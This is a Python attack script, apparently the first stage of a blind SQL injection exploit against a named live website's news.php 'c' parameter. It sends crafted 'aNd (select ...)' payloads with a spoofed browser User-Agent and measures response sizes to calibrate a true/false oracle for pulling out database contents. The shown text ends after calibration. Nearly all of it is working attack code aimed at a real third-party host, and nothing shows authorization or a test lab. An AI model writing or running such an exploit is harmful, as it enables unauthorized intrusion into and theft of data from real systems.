#!/usr/bin/env python3
"""zagroup: NUMERIC injection confirmed! Extract via arithmetic oracle
c=259 aNd (cond) - true=4645+ (more rows?), false=4627
"""
import urllib.request, urllib.parse, string, time, sys

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
BASE = "http://zagroup.net/news.php"
CHARS = string.digits + string.ascii_lowercase + string.ascii_uppercase + "_-."

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, len(r.read())
    except urllib.error.HTTPError as e:
        return e.code, len(e.read(5000))
    except Exception:
        return 0, 0

def sz(param_val):
    code, size = fetch(BASE + "?c=" + param_val)
    return size

# calibrate numeric oracle
print("=== calibrate ===", flush=True)
sizes = []
for v in ["259", "259-0", "259aNd(select%201)=1", "259aNd(select%201)=2",
          "259aNd(select%20length(database()))=3", "259aNd(select%20length(database()))=9"]:
    s = sz(v)
    print("  %-40s %d" % (v, s), flush=True)
    sizes.append(s)
    time.sleep(1.5)

# base row size
base_sz = sz("259")
print("base: %d" % base_sz, flush=True)
